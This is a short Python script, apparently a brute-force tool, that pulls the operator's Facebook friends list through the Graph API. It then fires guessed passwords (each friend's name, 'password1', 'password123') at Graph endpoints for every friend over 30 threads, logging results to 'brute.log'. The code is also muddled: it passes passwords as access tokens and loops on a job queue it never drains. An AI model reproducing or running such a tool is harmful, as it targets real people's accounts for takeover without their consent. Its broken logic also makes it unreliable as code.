import requests, re, os, random, time 
from concurrent.futures import ThreadPoolExecutor 
from datetime import datetime, timedelta
from rich import print as prints
from rich.progress import Progress
from rich.traceback import install
from rich.console import Console
from rich.table import Table
from collections import deque
import logging

logging.basicConfig(filename="brute.log", level=logging.INFO)

console = Console()
N_THREADS = 30

install()
progress = Progress()
jobs = deque()

class User:
    def __init__(self, id, name):
        self.id = id
        self.name = name.lower()
        self.pwv = [self.name, 'password1', 'password123']
        [jobs.append((self, pw)) for pw in self.pwv]

def get_friends_list(api_token):
    session = requests.Session()
    session.headers.update({'Authorization': f'Bearer {api_token}'})
    username = session.get('https://graph.facebook.com/me').json()['name']
    friends = f"https://graph.facebook.com/{username}/friends"
    response = session.get(friends).json()['data']
    print(f"Fetched {len(response)} friends for {username}")
    return [User(i['id'], i['name']) for i in response]

def get_user_agent():
    ua  = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0'
    return {'User-Agent': ua}

def metode(job, session=None):
    session = session or requests.Session()
    session.headers.update(get_user_agent())
    user, pw = job
    response = session.get(f'https://graph.facebook.com/{user.id}/accounts/test-users?access_token={pw}').json()

    # Printing result
    table = Table(title=f"Attempting to fetch user for {user.id} with {pw}", show_header=True, header_style="bold cyan")
    table.add_column("ID", style="dim", width=12)
    table.add_column("Name")
    if 'error' in response:
        logging.info(f"{job} returned {response['error']}")
        table.add_column("Error")
        table.add_row(user.id, user.name, response['error']['message'])
    else:
        logging.info(f"{job} returned ID")
        fetchedId = response['data'][0]['id']
        table.add_column("Fetched ID")
        table.add_row(user.id, user.name, fetchedId)
    console.print(table)


print("Fetching friends list...")
friends = get_friends_list('<YOUR_FB_API_TOKEN>')
with progress:
    with ThreadPoolExecutor(max_workers=N_THREADS) as ex:
        while jobs:
            ex.map(metode, jobs)
            time.sleep(0.02)
